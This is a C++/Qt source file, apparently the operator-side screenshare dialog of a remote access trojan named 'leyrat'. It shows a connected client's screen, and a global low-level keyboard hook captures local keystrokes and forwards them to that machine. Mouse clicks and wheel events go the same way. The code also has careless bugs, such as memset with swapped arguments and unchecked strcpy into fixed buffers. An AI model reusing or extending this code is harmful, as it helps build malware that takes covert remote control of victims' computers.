#include "screenshare.h"
#include "ui_screenshare.h"
#include "ui_mainwindow.h"

#include <QHBoxLayout>
#include <QVBoxLayout>
#include <QTableWidget>

#include <windows.h>

#include "leyrat.h"

extern leyrat rat;
extern Ui::MainWindow *mainwin;

Ui::Screenshare *screenshareui = 0;
Screenshare* screenshare = 0;


#pragma comment(lib, "User32.lib")

HHOOK HookKbd = NULL; // hook handle

bool is_shift = false;
bool is_ctrl = false;
bool is_alt = false;

LRESULT CALLBACK KbdHook(int nCode, WPARAM wp, LPARAM lp)
{

    std::string a =  std::string("DUDE") + std::string("HI");

    if (nCode!=HC_ACTION||!screenshare->isVisible())
        return CallNextHookEx(HookKbd, nCode, wp, lp);

    KBDLLHOOKSTRUCT *pkh = (KBDLLHOOKSTRUCT *)lp;


    bool focused =  screenshareui->label->hasFocus();

    if(focused)
    {


        if(pkh->vkCode==VK_CAPITAL)
        {
            return 1;//too buggy
        }

        if(pkh->vkCode==VK_LCONTROL)
        {
            is_ctrl = wp==WM_KEYDOWN;
            return 1;
        }

        if(pkh->vkCode == VK_LMENU||pkh->vkCode == VK_MENU||pkh->vkCode==VK_RMENU)
        {
            is_alt = wp==WM_SYSKEYDOWN;//alt uses weird syskey shit

            return 1;
        }

        if(pkh->vkCode == VK_LSHIFT)
        {
            is_shift = wp==WM_KEYDOWN;

            return 1;
        }

        if(wp!=WM_KEYDOWN&&wp!=WM_KEYUP&&wp!=WM_SYSKEYDOWN&&wp!=WM_SYSKEYUP)
            return 1;


        int vkcode = pkh->vkCode;

        QList<QTableWidgetItem *> selected = mainwin->tableWidget->selectedItems();
        QTableWidgetItem *item;


        unsigned char input[30];
        memset(input, 0, 30);

        int data = 0;

        if(wp==WM_KEYUP||wp==WM_SYSKEYUP)
        {
            data = KEYEVENTF_KEYUP;
        }

        int num = 0;
        unsigned char strokes = 0;

        if (is_alt)
        {
            input[num++] = VK_MENU;
            input[num++] = data;
            strokes++;
        }

        if (is_ctrl)
        {
            input[num++] = VK_LCONTROL;
            input[num++] = data;
            strokes++;
        }

        if (is_shift)
        {
            input[num++] = VK_LSHIFT;
            input[num++] = data;
            strokes++;
        }

        input[num++] = vkcode;
        input[num++] = data;
        strokes++;

        foreach (item, selected) {

            if(item->column() != 2)  continue;
            rat.Request_ScreenshareInput(item->text().toStdString().c_str(), strokes, input, num);

            break;
        }

        return 1;
    }
    return CallNextHookEx(HookKbd, nCode, wp, lp);
}

int suppresskeythread()
{

    HookKbd = SetWindowsHookEx(WH_KEYBOARD_LL, KbdHook, GetModuleHandle(0), 0);

    if (!HookKbd)
    {
        printf("Couldn't hook kbd!");
        return 0;
    }

    MSG msg;

    while(1)
    {
        while (PeekMessage(&msg, NULL, 0, 0, 1) > 0)
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);

        }
    }
    return 0;
}

char lastpreset[100];
char lastline[100];

int lastfps = 10;

Screenshare::Screenshare(QWidget *parent) :
    QDialog(parent),
    ui(new Ui::Screenshare)
{
    ui->setupUi(this);
    this->setWindowTitle("Screenshare");

    this->setWindowFlags(windowFlags() & ~Qt::WindowContextHelpButtonHint);

    //QPixmap pic("blank.png");
    //QPixmap scaled=pic.scaled ( ui->label->width(), ui->label->height() );
    //this->ui->label->setPixmap(scaled);
    screenshareui = this->ui;
    screenshare = this;

    //this->ui->label->setScaledContents( true );

    QGridLayout *hlayout = new QGridLayout;

    hlayout->addWidget(this->ui->label, 0, 0, 2, 2, 0);


    QVBoxLayout *hboxlayout = new QVBoxLayout;

    this->ui->comboBox->setMaximumSize(this->ui->comboBox->width(),this->ui->comboBox->height());
    this->ui->comboBox->setMinimumSize(this->ui->comboBox->width(),this->ui->comboBox->height());

    this->ui->comboBox_2->setMaximumSize(this->ui->comboBox_2->width(),this->ui->comboBox_2->height());
    this->ui->comboBox_2->setMinimumSize(this->ui->comboBox_2->width(),this->ui->comboBox_2->height());

    this->ui->plainTextEdit->setMaximumSize(this->ui->plainTextEdit->width(),this->ui->plainTextEdit->height());
    this->ui->plainTextEdit->setMinimumSize(this->ui->plainTextEdit->width(),this->ui->plainTextEdit->height());

    this->ui->pushButton->setMaximumSize(this->ui->pushButton->width(),this->ui->pushButton->height());
    this->ui->pushButton->setMinimumSize(this->ui->pushButton->width(),this->ui->pushButton->height());


    hboxlayout->addWidget(this->ui->comboBox,0);
    hboxlayout->addWidget(this->ui->comboBox_2, 0);
    hboxlayout->addWidget(this->ui->plainTextEdit,0);

    hboxlayout->addWidget(this->ui->pushButton,0);

    this->ui->pushButton->setFocusPolicy(Qt::NoFocus);

    QGridLayout *hgloblayout = new QGridLayout;
    hgloblayout->addLayout(hlayout, 0, 0, 2, 2);
    hgloblayout->addLayout(hboxlayout,0,0,2,2, Qt::AlignTop);
    hgloblayout->setContentsMargins(0, 0, 0, 0);

    this->setLayout(hgloblayout);

    QPixmap pic("blank.png");
    QPixmap scaled=pic.scaled ( ui->label->width(), ui->label->height() );
    this->ui->label->setPixmap(scaled);

    this->ui->label->setTextInteractionFlags(Qt::TextSelectableByMouse);

    screenshare = this;
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)suppresskeythread, 0, 0, 0);

    connect( this, SIGNAL( NewImage( QPixmap ) ), this, SLOT( slotNewImage( QPixmap ) ) );

    this->ui->comboBox->setCurrentIndex(4);

    strcpy(lastpreset, "veryfast");
    strcpy(lastline, "baseline");

}

Screenshare::~Screenshare()
{
    delete ui;
}

void Screenshare::slotNewImage(QPixmap img)
{
    this->ui->label->setPixmap(img);
}


extern int lastscreenshare_w;
extern int lastscreenshare_h;

void Screenshare::wheelEvent(QWheelEvent *wheelevent)
{
    QList<QTableWidgetItem *> selected = mainwin->tableWidget->selectedItems();
    QTableWidgetItem *item;

    int event = MOUSEEVENTF_WHEEL;

    foreach (item, selected) {

        if(item->column() != 2)  continue;
        rat.Request_ScreenshareInput(item->text().toStdString().c_str(), 0, 0, event, wheelevent->delta());
        break;
    }

    wheelevent->accept();
}

void Screenshare::on_label_pressed(int x, int y, bool is_right)
{

    float ratiox = (float)x/(float)this->ui->label->width();
    float ratioy = (float)y/(float)this->ui->label->height();

    float fposx = ratiox*(float)lastscreenshare_w;
    float fposy = ratioy*(float)lastscreenshare_h;

    int posx = (int)fposx;
    int posy = (int)fposy;

    QList<QTableWidgetItem *> selected = mainwin->tableWidget->selectedItems();
    QTableWidgetItem *item;

    printf("DOWN\n");

    int event = MOUSEEVENTF_LEFTDOWN;

    if(is_right)
    {
        event = MOUSEEVENTF_RIGHTDOWN;
        //idk
    }

    foreach (item, selected) {

        if(item->column() != 2)  continue;
        rat.Request_ScreenshareInput(item->text().toStdString().c_str(), posx, posy, event, 0);
        break;
    }
}

void Screenshare::on_label_released(int x, int y, bool is_right)
{

    float ratiox = (float)x/(float)this->ui->label->width();
    float ratioy = (float)y/(float)this->ui->label->height();

    float fposx = ratiox*(float)lastscreenshare_w;
    float fposy = ratioy*(float)lastscreenshare_h;

    int posx = (int)fposx;
    int posy = (int)fposy;


    printf("UP\n");

    QList<QTableWidgetItem *> selected = mainwin->tableWidget->selectedItems();
    QTableWidgetItem *item;

    int event = MOUSEEVENTF_LEFTUP;

    if(is_right)
    {
        event = MOUSEEVENTF_RIGHTUP;
        //idk
    }

    foreach (item, selected) {

        if(item->column() != 2)  continue;
        rat.Request_ScreenshareInput(item->text().toStdString().c_str(), posx, posy, event, 0);
        break;
    }
}

int screenshare_blockimg = 0;

void Screenshare::on_pushButton_pressed()
{
    screenshare_blockimg = 5;
    if(screenshare->isFullScreen()) {
        screenshare->setWindowState(screenshare->windowState() & ~Qt::WindowFullScreen);
    }else{
        screenshare->setWindowState(screenshare->windowState()|Qt::WindowFullScreen);
    }

}
inline unsigned int poweroftwo(unsigned int totwo)
{

    --totwo;
    totwo |= totwo >> 1;
    totwo |= totwo >> 2;
    totwo |= totwo >> 4;
    totwo |= totwo >> 8;
    totwo |= totwo >> 16;

    return ++totwo;
}


void Screenshare::on_plainTextEdit_textChanged()//fps
{
    QList<QTableWidgetItem *> selected = mainwin->tableWidget->selectedItems();
    QTableWidgetItem *item;

    int num = atoi(ui->plainTextEdit->toPlainText().toStdString().c_str());
    int l = ui->plainTextEdit->toPlainText().length();



    if(num>30)
    {
        ui->plainTextEdit->setPlainText(QString("30"));
        num = 30;
    }

    if(2>num)
    {
        ui->plainTextEdit->setPlainText(QString("2"));
        num = 2;
    }

    if(l>2)
    {
        char cnum[5] = {0};
        sprintf(cnum, "%i", num);
        ui->plainTextEdit->setPlainText(QString(cnum));
    }


    lastfps = num;

    foreach (item, selected) {

        if(item->column() != 2)  continue;
        rat.Request_Screenshare(item->text().toStdString().c_str() ,lastline, lastpreset, poweroftwo(this->width()), poweroftwo(this->height()), lastfps);
        break;

    }
}


void Screenshare::closeEvent(QCloseEvent *)
{

    QPixmap pic("blank.png");
    QPixmap scaled=pic.scaled ( ui->label->width(), ui->label->height() );
    this->ui->label->setPixmap(scaled);


    for(int i=0;i<rat.numonlineclients;i++)
    {
        onlineuser *cl = rat.GetClient(i);
        cl->is_screensharing = false;
    }
}

void Screenshare::hideEvent(QHideEvent *)
{

    QPixmap pic("blank.png");
    QPixmap scaled=pic.scaled ( ui->label->width(), ui->label->height() );
    this->ui->label->setPixmap(scaled);


    for(int i=0;i<rat.numonlineclients;i++)
    {
        onlineuser *cl = rat.GetClient(i);
        cl->is_screensharing = false;
    }
}


void Screenshare::on_comboBox_currentTextChanged(const QString &arg1)
{
    QList<QTableWidgetItem *> selected = mainwin->tableWidget->selectedItems();
    QTableWidgetItem *item;

    memset(lastpreset, 100, 0);
    strcpy(lastpreset, arg1.toStdString().c_str());

    foreach (item, selected) {

        if(item->column() != 2)  continue;
        rat.Request_Screenshare(item->text().toStdString().c_str(),lastline, lastpreset, poweroftwo(this->width()), poweroftwo(this->height()), lastfps);
        break;

    }
}

void Screenshare::on_comboBox_2_currentTextChanged(const QString &arg1)
{
    QList<QTableWidgetItem *> selected = mainwin->tableWidget->selectedItems();
    QTableWidgetItem *item;

    memset(lastline, 100, 0);
    strcpy(lastline, arg1.toStdString().c_str());

    foreach (item, selected) {

        if(item->column() != 2)  continue;
        rat.Request_Screenshare(item->text().toStdString().c_str(),lastline, lastpreset, poweroftwo(this->width()), poweroftwo(this->height()), lastfps);
        break;

    }

}
